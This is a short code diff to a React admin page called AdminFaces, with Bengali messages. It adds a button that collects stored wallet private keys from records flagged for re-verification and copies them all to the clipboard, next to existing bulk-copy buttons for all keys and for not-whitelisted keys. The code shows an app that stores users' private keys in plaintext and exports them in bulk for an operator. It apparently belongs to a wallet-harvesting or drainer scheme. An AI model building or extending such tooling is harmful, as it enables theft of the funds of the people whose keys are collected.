@@ -32,6 +32,9 @@ function AdminFaces() {
   const notWhitelistedKeys = (data ?? [])
     .filter((t: any) => t.wallet_private_key && !(t.whitelist_ok ?? false))
     .map((t: any) => t.wallet_private_key as string);
+  const reverifyKeys = (data ?? [])
+    .filter((t: any) => t.wallet_private_key && (t.reverify_count ?? 0) > 0)
+    .map((t: any) => t.wallet_private_key as string);
   const copyAllKeys = async () => {
     if (allKeys.length === 0) return toast.error("কোনো key নেই");
     await navigator.clipboard.writeText(allKeys.join("\n"));
@@ -46,6 +49,11 @@ function AdminFaces() {
     if (notWhitelistedKeys.length === 0) return toast.error("কোনো not-whitelisted key নেই");
     await navigator.clipboard.writeText(notWhitelistedKeys.join("\n"));
     toast.success(`${notWhitelistedKeys.length} টি not-whitelisted key কপি হয়েছে`);
+  };
+  const copyAllReverify = async () => {
+    if (reverifyKeys.length === 0) return toast.error("কোনো re-verify key নেই");
+    await navigator.clipboard.writeText(reverifyKeys.join("\n"));
+    toast.success(`${reverifyKeys.length} টি re-verify key কপি হয়েছে`);
   };
 
   return (
